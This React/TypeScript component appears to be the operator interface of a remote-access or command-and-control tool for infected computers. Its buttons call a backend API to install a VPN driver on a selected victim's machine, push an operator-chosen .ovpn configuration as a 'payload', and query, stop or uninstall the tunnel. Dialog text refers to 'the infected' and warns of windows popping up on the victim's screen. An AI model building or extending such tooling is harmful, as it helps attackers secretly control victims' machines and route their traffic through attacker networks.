import React, { useState } from 'react';
import { User } from "@/Interfaces/User.ts";
import { json } from 'stream/consumers';

export function VPNButtons (
{
    typeOutput,
    selectedUser,
    clearConsole,
    setOutput
}: {
    typeOutput: (text: string) => Promise<void>,
    selectedUser: User | null,
    clearConsole: () => void,
    setOutput: (value: React.SetStateAction<string[]>) => void
}) {
    const [file, setFile] = useState<File | null>(null);

    // Function to handle file selection via a hidden file input
    const handleFileSelect = async () => {
        const input = document.createElement("input");
        input.type = "file";
        input.accept = ".ovpn";
        input.onchange = (event: Event) => {
            const target = event.target as HTMLInputElement;
            if (target.files && target.files.length > 0) {
                setFile(target.files[0]);
                target.files[0].text().then(async (text) => {
                    await typeOutput(`> Selected VPN configuration file:`);
                    setOutput(prev => [...prev, text]);
                });
            }
        };
        input.click();
    };

    const startVPN = async () => {
        // Prompt the user to select a file if not already selected
        if (!file) {
            await handleFileSelect();
        }

        if (!file) {
            await typeOutput("> No VPN configuration file selected.");
            return;
        }

        

        // Ask for user confirmation before proceeding
        const userConfirmed = window.confirm("Are you sure you want to connect the infected to the VPN?");
        if (!userConfirmed) {
            await typeOutput("> VPN connection cancelled by user.");
            return;
        }

        await typeOutput("> Connecting to VPN, please wait...");

        // Create a FormData object to send the file and ID
        const formData = new FormData();
        formData.append("file", file);
        if (selectedUser?.uuid) {
            formData.append("id", selectedUser.uuid);
        }

        // Send the file and user ID to the connect API endpoint
        const response = await fetch("http://localhost:8000/api/modules/vpn/connect?id=" + selectedUser?.uuid, {
            method: "POST",
            body: formData,
        });

        if (response.ok) {
            await typeOutput("> Successfully launched VPN connexion payload. Could take a few seconds to establish connection. Use the \"VPN/Status\" command to check the connection status.");
        } else {
            const errorData = await response.json();
            await typeOutput(`> Failed to connect to VPN: ${errorData.detail || response.statusText}`);
        }
    };

    const stopVPN = async () => {
        await typeOutput("> Stopping VPN, please wait...");
        await fetch("http://localhost:8000/api/modules/vpn/stop?id=" + selectedUser?.uuid);
        await typeOutput("> VPN stopped.");
    };

    const statusVPN = async () => {
        await typeOutput("> Getting VPN status, please wait...");
        const response = await fetch("http://localhost:8000/api/modules/vpn/status?id=" + selectedUser?.uuid);
        if (response.ok) {
            const data = await response.json();
            
            Object.entries(data).forEach(async ([key, value]) => {
                await typeOutput("> VPN status check:");
                setOutput(prev => [...prev, `Network Card Name: "${key}"`]);
                setOutput(prev => [...prev, `IP Address: ${value}`]);
            });
        }
        else {
            const errorData = await response.json();
            await typeOutput(`> Failed to connect to VPN: ${errorData.detail || response.statusText}`);
        }
    };

    const installVPN = async () => {
        await typeOutput("> Installing VPN, please wait...");
        const userConfirmed = window.confirm("The user will have popping windows on screen for some seconds. Are you sure you want to install VPN driver on his machine ?");
        if (!userConfirmed) {
            await typeOutput("> VPN installation cancelled by user.");
            return;
        }
        await fetch("http://localhost:8000/api/modules/vpn/install?id=" + selectedUser?.uuid);
        await typeOutput("> VPN installed.");
    };

    const uninstallVPN = async () => {
        await typeOutput("> Uninstalling VPN, please wait...");
        await fetch("http://localhost:8000/api/modules/vpn/uninstall?id=" + selectedUser?.uuid);
        await typeOutput("> VPN uninstalled.");
    };

    return (
        <div className="mr-4 space-y-4 text-green-500 h-1/2">
            <button 
                onClick={async () => await installVPN()}
                className="mr-4 border border-green-500 p-3 rounded-lg cursor-pointer hover:border-green-400 hover:bg-green-300 hover:text-black shadow-lg shadow-green-500/50">
                <p>Install drivers</p>
            </button>
            
            <button
                onClick={async () => await startVPN()}
                className="mr-4 border border-green-500 p-3 rounded-lg cursor-pointer hover:border-green-400 hover:bg-green-300 hover:text-black shadow-lg shadow-green-500/50">
                <p>Connect</p>
            </button>

            <button
                onClick={async () => await statusVPN()}
                className="mr-4 border border-green-500 p-3 rounded-lg cursor-pointer hover:border-green-400 hover:bg-green-300 hover:text-black shadow-lg shadow-green-500/50">
                <p>Status</p>
            </button>

            <button
                onClick={async () => await stopVPN()}
                className="mr-4 p-3 border-dashed rounded-md bg-red-900/50 hover:bg-red-700/50 text-red-400 cursor-pointer border border-red-500 shadow-lg shadow-red-500/50">
                <p>Stop</p>
            </button>

            <button
                onClick={async () => await uninstallVPN()}
                className="p-3 border-dashed rounded-md bg-red-900/50 hover:bg-red-700/50 text-red-400 cursor-pointer border border-red-500 shadow-lg shadow-red-500/50">
                <p>Uninstall</p>
            </button>
            
        </div>
    );
}

export default VPNButtons;
